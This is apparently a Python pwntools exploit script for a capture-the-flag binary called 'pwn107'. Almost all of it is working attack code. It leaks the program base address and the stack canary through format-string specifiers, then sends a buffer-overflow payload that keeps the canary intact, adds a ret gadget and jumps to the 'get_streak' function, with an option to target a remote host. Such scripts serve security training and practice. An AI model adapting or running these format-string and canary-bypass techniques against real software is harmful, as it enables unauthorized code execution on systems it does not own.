from pwn import *
from struct import pack
from Crypto.Util.number import bytes_to_long as btl, long_to_bytes as ltb
import sys

BINARY = "pwn107.pwn107_patched"
context.binary = exe = ELF(f"./{BINARY}", checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"


def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script):
        if not args.RMT:
            attach(self.p, script)

    def leak(self, content) -> str:
        p = self.p
        p.sendlineafter(b"What's your last streak?", content)
        p.recvuntil(b"streak: ")
        return p.recvline().decode().strip()

    def send(self, content):
        p = self.p
        p.sendlineafter(b"We miss you!", content)


def bruteleak():
    with context.silent:
        for i in range(1, 21):
            x, _ = init()
            print(f"{i}:", x.leak(f"%{i}$lp".encode()))


# bruteleak()
# breakpoint()
# %11$lp pie:exe dif:0x780
# %13$lp canary

x, p = init()

leaked = x.leak(b"%11$lp %13$lp").split()
exe.address = eval(leaked[0]) - 0x780
canary = eval(leaked[1])

log.success("exe    @ {}".format(hex(exe.address)))
log.success("canary @ {}".format(hex(canary)))

payload = b""
payload += cyclic(24)
payload += pack("<Q", canary)
payload += cyclic(8)
payload += pack("<Q", ROP(exe).find_gadget(['ret'])[0])
payload += pack("<Q", exe.symbols['get_streak'])

x.debug("break *main+225\nc")
x.send(payload)

p.interactive()
